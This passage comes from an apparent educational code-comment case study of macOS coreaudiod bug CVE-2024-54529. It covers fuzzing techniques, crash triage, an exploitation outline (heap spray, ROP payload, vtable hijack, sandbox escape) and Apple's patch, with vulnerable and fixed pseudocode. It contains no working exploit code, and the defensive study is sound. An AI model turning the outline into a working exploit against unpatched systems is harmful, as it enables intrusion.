 *   â”‚   GENERATION 2: Grammar-Based Fuzzing                               â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                  â”‚
 *   â”‚   â€¢ Understands input format                                        â”‚
 *   â”‚   â€¢ Generates syntactically valid inputs                            â”‚
 *   â”‚   â€¢ Better coverage of parser code                                  â”‚
 *   â”‚   â€¢ Still misses semantic issues                                    â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   GENERATION 3: Coverage-Guided Fuzzing (AFL, libFuzzer)            â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€               â”‚
 *   â”‚   â€¢ Tracks code coverage                                            â”‚
 *   â”‚   â€¢ Mutates inputs that find new paths                              â”‚
 *   â”‚   â€¢ Evolutionary approach                                           â”‚
 *   â”‚   â€¢ Much better at finding deep bugs                                â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   GENERATION 4: Knowledge-Driven Fuzzing â—€â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•   â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                            â”‚
 *   â”‚   â€¢ Understands API semantics                                       â”‚
 *   â”‚   â€¢ Chains API calls in valid sequences                             â”‚
 *   â”‚   â€¢ Knows about state dependencies                                  â”‚
 *   â”‚   â€¢ Targets specific vulnerability classes                          â”‚
 *   â”‚   â€¢ THIS IS WHAT PROJECT ZERO USED                                  â”‚
 *   â”‚                                                                     â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * For IPC fuzzing, knowledge-driven fuzzing means:
 *   - Understanding which messages create objects
 *   - Understanding which messages reference objects by ID
 *   - Understanding which messages require specific object types
 *   - Deliberately sending wrong object types to see what happens
 *
 * -----------------------------------------------------------------------------
 * 6.2 THE API CALL CHAINING TECHNIQUE
 * -----------------------------------------------------------------------------
 *
 * Many IPC handlers require prior state to be useful. For example:
 *   - You can't fetch a workgroup port without first creating an IOContext
 *   - You can't create an IOContext without first opening a client
 *   - You can't do most things without first registering
 *
 * API Call Chaining solves this by automatically discovering and executing
 * the prerequisite API calls:
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚              API CALL CHAINING EXAMPLE                              â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚   GOAL: Fuzz XIOContext_Fetch_Workgroup_Port (ID: 1010059)         â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   PROBLEM: Handler requires valid IOContext object ID              â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   SOLUTION: Chain prerequisite calls                               â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
 *   â”‚   â”‚                                                            â”‚   â”‚
 *   â”‚   â”‚  Step 1: XSystem_Open                                      â”‚   â”‚
 *   â”‚   â”‚          â””â”€â”€ Creates client, returns client_id             â”‚   â”‚
 *   â”‚   â”‚                                                            â”‚   â”‚
 *   â”‚   â”‚  Step 2: XDevice_CreateIOContext (using client_id)         â”‚   â”‚
 *   â”‚   â”‚          â””â”€â”€ Creates IOContext, returns iocontext_id       â”‚   â”‚
 *   â”‚   â”‚                                                            â”‚   â”‚
 *   â”‚   â”‚  Step 3: XIOContext_Fetch_Workgroup_Port (iocontext_id)    â”‚   â”‚
 *   â”‚   â”‚          â””â”€â”€ THIS IS WHAT WE FUZZ                          â”‚   â”‚
 *   â”‚   â”‚                                                            â”‚   â”‚
 *   â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   THE KEY INSIGHT:                                                  â”‚
 *   â”‚   Instead of passing iocontext_id, pass engine_id!                 â”‚
 *   â”‚   The handler doesn't verify the type â†’ TYPE CONFUSION             â”‚
 *   â”‚                                                                     â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * The fuzzer discovers this by:
 *   1. Recording all object IDs created by any message
 *   2. When fuzzing a handler that takes an object ID, try ALL known IDs
 *   3. Including IDs of wrong object types
 *   4. Monitor for crashes or unexpected behavior
 *
 * -----------------------------------------------------------------------------
 * 6.3 BUILDING THE FUZZING HARNESS
 * -----------------------------------------------------------------------------
 *
 * Project Zero built a custom harness for fuzzing coreaudiod:
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚              FUZZING HARNESS ARCHITECTURE                           â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚   Traditional Approach (SLOW):                                      â”‚
 *   â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
 *   â”‚   â”‚ Fuzzer â†’ mach_msg() â†’ kernel â†’ coreaudiod â†’ handler        â”‚   â”‚
 *   â”‚   â”‚                                                            â”‚   â”‚
 *   â”‚   â”‚ Problems:                                                  â”‚   â”‚
 *   â”‚   â”‚   â€¢ Kernel context switching is slow                       â”‚   â”‚
 *   â”‚   â”‚   â€¢ Hard to get coverage from separate process             â”‚   â”‚
 *   â”‚   â”‚   â€¢ Crashes kill the daemon (need restart)                 â”‚   â”‚
 *   â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   Project Zero Approach (FAST):                                     â”‚
 *   â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
 *   â”‚   â”‚ Fuzzer â†’ _HALB_MIGServer_server() directly (in-process)    â”‚   â”‚
 *   â”‚   â”‚                                                            â”‚   â”‚
 *   â”‚   â”‚ Benefits:                                                  â”‚   â”‚
 *   â”‚   â”‚   â€¢ No kernel overhead                                     â”‚   â”‚
 *   â”‚   â”‚   â€¢ Direct coverage instrumentation                        â”‚   â”‚
 *   â”‚   â”‚   â€¢ Can catch crashes and continue                         â”‚   â”‚
 *   â”‚   â”‚   â€¢ Much higher throughput                                 â”‚   â”‚
 *   â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   Implementation:                                                   â”‚
 *   â”‚   1. Link fuzzer against CoreAudio framework                       â”‚
 *   â”‚   2. Call _HALB_MIGServer_server() with crafted messages           â”‚
 *   â”‚   3. Use TinyInst for dynamic instrumentation                      â”‚
 *   â”‚   4. Track coverage and evolve inputs                              â”‚
 *   â”‚                                                                     â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * Key tool: TinyInst (https://github.com/googleprojectzero/TinyInst)
 *   - Lightweight dynamic binary instrumentation
 *   - Works on macOS, Windows, Linux
 *   - Used for coverage-guided fuzzing
 *
 * -----------------------------------------------------------------------------
 * 6.4 COVERAGE METRICS AND IMPROVEMENTS
 * -----------------------------------------------------------------------------
 *
 * The effectiveness of fuzzing can be measured by code coverage:
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚              COVERAGE IMPROVEMENT JOURNEY                           â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚   BASELINE: Random message fuzzing                                  â”‚
 *   â”‚   â””â”€â”€ Coverage: ~5% of reachable code                              â”‚
 *   â”‚       Most messages rejected as malformed                          â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   IMPROVEMENT 1: Valid message structure                            â”‚
 *   â”‚   â””â”€â”€ Coverage: ~15%                                                â”‚
 *   â”‚       Messages accepted but fail auth/validation                   â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   IMPROVEMENT 2: Client registration                                â”‚
 *   â”‚   â””â”€â”€ Coverage: ~30%                                                â”‚
 *   â”‚       Can now reach handlers that require client                   â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   IMPROVEMENT 3: API call chaining                                  â”‚
 *   â”‚   â””â”€â”€ Coverage: ~60%                                                â”‚
 *   â”‚       Can create objects and reference them                        â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   IMPROVEMENT 4: Cross-type object ID fuzzing                       â”‚
 *   â”‚   â””â”€â”€ Coverage: ~70%+                                               â”‚
 *   â”‚       Tests type confusion scenarios                               â”‚
 *   â”‚       FOUND CVE-2024-54529!                                        â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   Project Zero reported >2000% coverage improvement using these    â”‚
 *   â”‚   techniques compared to naive fuzzing.                            â”‚
 *   â”‚                                                                     â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * Reference: "Breaking the Sound Barrier Part I"
 *   https://projectzero.google/2025/05/breaking-sound-barrier-part-i-fuzzing.html
 *
 * -----------------------------------------------------------------------------
 * 6.5 FROM CRASH TO EXPLOITABLE: THE ANALYSIS PROCESS
 * -----------------------------------------------------------------------------
 *
 * Finding a crash is just the beginning. The analysis process:
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚              CRASH ANALYSIS WORKFLOW                                â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚   STEP 1: CRASH TRIAGE                                              â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                             â”‚
 *   â”‚   â€¢ Is it reproducible?                                             â”‚
 *   â”‚   â€¢ What's the crash signature?                                     â”‚
 *   â”‚   â€¢ Is it a null deref, wild pointer, or controlled?                â”‚
 *   â”‚   â€¢ Does ASAN/Guard Malloc reveal more?                             â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   For CVE-2024-54529:                                               â”‚
 *   â”‚   â”œâ”€â”€ Crash at: HALS_IOContext::FetchWorkgroupPort+0x5a            â”‚
 *   â”‚   â”œâ”€â”€ Faulting instruction: mov rax, qword ptr [rdi+0x68]          â”‚
 *   â”‚   â”œâ”€â”€ RDI contains pointer to Engine object (not IOContext!)       â”‚
 *   â”‚   â””â”€â”€ Offset 0x68 of Engine is uninitialized â†’ 0xAAAAAAAA          â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   STEP 2: ROOT CAUSE ANALYSIS                                       â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                          â”‚
 *   â”‚   â€¢ Why did this happen?                                            â”‚
 *   â”‚   â€¢ What assumption was violated?                                   â”‚
 *   â”‚   â€¢ What's the underlying bug class?                                â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   For CVE-2024-54529:                                               â”‚
 *   â”‚   â”œâ”€â”€ Handler fetches object by ID without type check              â”‚
 *   â”‚   â”œâ”€â”€ Attacker controls object ID in message                       â”‚
 *   â”‚   â”œâ”€â”€ Can provide ID of wrong object type                          â”‚
 *   â”‚   â””â”€â”€ Bug class: TYPE CONFUSION (CWE-843)                          â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   STEP 3: EXPLOITABILITY ASSESSMENT                                 â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                    â”‚
 *   â”‚   â€¢ Can we control the corrupted data?                              â”‚
 *   â”‚   â€¢ What primitives does this give us?                              â”‚
 *   â”‚   â€¢ Are there mitigations to bypass?                                â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   For CVE-2024-54529:                                               â”‚
 *   â”‚   â”œâ”€â”€ Offset 0x68 of Engine can be controlled                      â”‚
 *   â”‚   â”œâ”€â”€ Control leads to vtable hijack                               â”‚
 *   â”‚   â”œâ”€â”€ x86-64: No PAC, can use ROP                                  â”‚
 *   â”‚   â”œâ”€â”€ Need heap spray to place controlled data                     â”‚
 *   â”‚   â””â”€â”€ VERDICT: EXPLOITABLE for sandbox escape                      â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   STEP 4: EXPLOIT DEVELOPMENT                                       â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                          â”‚
 *   â”‚   â€¢ Develop heap grooming strategy                                  â”‚
 *   â”‚   â€¢ Build ROP chain for code execution                              â”‚
 *   â”‚   â€¢ Stabilize and increase reliability                              â”‚
 *   â”‚   â€¢ Write exploit code and PoC                                      â”‚
 *   â”‚                                                                     â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * -----------------------------------------------------------------------------
 * 6.6 FINDING THE UNINITIALIZED MEMORY
 * -----------------------------------------------------------------------------
 *
 * A key breakthrough was using Guard Malloc with PreScribble:
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚              GUARD MALLOC PRESCRIBBLE                               â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚   Guard Malloc is macOS's memory debugging allocator.              â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   To enable:                                                        â”‚
 *   â”‚   $ export MallocPreScribble=1                                     â”‚
 *   â”‚   $ export MallocScribble=1                                        â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   Or in Xcode: Edit Scheme â†’ Diagnostics â†’ Enable Guard Malloc    â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   What it does:                                                     â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                                     â”‚
 *   â”‚   PreScribble:  Fill new allocations with 0xAA bytes               â”‚
 *   â”‚   Scribble:     Fill freed allocations with 0x55 bytes             â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   Why it's useful:                                                  â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                                â”‚
 *   â”‚   â€¢ Makes uninitialized memory obvious (0xAAAAAAAA pattern)        â”‚
 *   â”‚   â€¢ Makes use-after-free visible (0x55555555 pattern)              â”‚
 *   â”‚   â€¢ Crashes are more deterministic                                 â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   Discovery:                                                        â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                                       â”‚
 *   â”‚   Running coreaudiod with PreScribble revealed that the HALS_Engineâ”‚
 *   â”‚   ('ngne') object type had uninitialized memory at offset 0x68.    â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   This meant: if we can control what memory the Engine object      â”‚
 *   â”‚   is allocated in, we can control offset 0x68!                     â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   Heap spray strategy:                                              â”‚
 *   â”‚   1. Spray heap with controlled data (ROP payload in CFStrings)    â”‚
 *   â”‚   2. Free some allocations to create holes                         â”‚
 *   â”‚   3. Trigger Engine object creation â†’ lands in our controlled hole â”‚
 *   â”‚   4. Engine's "uninitialized" offset 0x68 contains our pointer     â”‚
 *   â”‚                                                                     â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * =============================================================================
 * =============================================================================
 * PART 7: DEFENSIVE LESSONS AND PATCHING
 * =============================================================================
 * =============================================================================
 *
 * The final part of our case study: what can we learn to build better systems?
 *
 * -----------------------------------------------------------------------------
 * 7.1 APPLE'S FIX FOR CVE-2024-54529
 * -----------------------------------------------------------------------------
 *
 * Apple's fix was straightforward but effective:
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚              THE PATCH                                              â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚   BEFORE (VULNERABLE):                                              â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                             â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   void _XIOContext_Fetch_Workgroup_Port(mach_msg_t *msg) {          â”‚
 *   â”‚       uint32_t object_id = msg->body.object_id;                    â”‚
 *   â”‚                                                                     â”‚
 *   â”‚       // Fetch object - NO TYPE CHECK!                             â”‚
 *   â”‚       HALS_Object *obj = HALS_ObjectMap::CopyObjectByObjectID(     â”‚
 *   â”‚           object_id);                                              â”‚
 *   â”‚                                                                     â”‚
 *   â”‚       // DANGEROUS: Assumes obj is IOContext!                      â”‚
 *   â”‚       HALS_IOContext *ioct = (HALS_IOContext *)obj;                â”‚
 *   â”‚                                                                     â”‚
 *   â”‚       // Dereference at offset 0x68 - BOOM if wrong type           â”‚
 *   â”‚       mach_port_t port = ioct->workgroup_port;                     â”‚
 *   â”‚       ...                                                          â”‚
 *   â”‚   }                                                                 â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   AFTER (FIXED):                                                    â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                                   â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   void _XIOContext_Fetch_Workgroup_Port(mach_msg_t *msg) {          â”‚
 *   â”‚       uint32_t object_id = msg->body.object_id;                    â”‚
 *   â”‚                                                                     â”‚
 *   â”‚       HALS_Object *obj = HALS_ObjectMap::CopyObjectByObjectID(     â”‚
 *   â”‚           object_id);                                              â”‚
 *   â”‚                                                                     â”‚
 *   â”‚       // NEW: Type check before cast!                              â”‚
 *   â”‚       if (obj->GetType() != 'ioct') {                              â”‚
 *   â”‚           return kAudioHardwareBadObjectError;                     â”‚
 *   â”‚       }                                                            â”‚
 *   â”‚                                                                     â”‚
 *   â”‚       // Safe: we verified it's actually an IOContext              â”‚
 *   â”‚       HALS_IOContext *ioct = (HALS_IOContext *)obj;                â”‚
 *   â”‚       mach_port_t port = ioct->workgroup_port;                     â”‚
 *   â”‚       ...                                                          â”‚
 *   â”‚   }                                                                 â”‚
 *   â”‚                                                                     â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * Apple applied this fix to ALL affected handlers:
 *   - _XIOContext_Fetch_Workgroup_Port
 *   - _XIOContext_Start
 *   - _XIOContext_StartAtTime
 *   - _XIOContext_Start_With_WorkInterval
 *   - _XIOContext_SetClientControlPort
 *   - _XIOContext_Stop
 *
 * Versions with the fix:
 *   - macOS Sequoia 15.2
 *   - macOS Sonoma 14.7.2
 *   - macOS Ventura 13.7.2
 *
 * -----------------------------------------------------------------------------
 * 7.2 PATTERNS TO AUDIT FOR
 * -----------------------------------------------------------------------------
 *
 * When auditing IPC services, look for these patterns:
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚              VULNERABILITY PATTERNS                                 â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚   PATTERN 1: Unvalidated Object Lookup                              â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                 â”‚
 *   â”‚   obj = lookup(id);          // Lookup by untrusted ID             â”‚
 *   â”‚   obj->method();             // No type check before use           â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   FIX: Always verify object type after lookup                      â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   PATTERN 2: Implicit Type Assumption                               â”‚
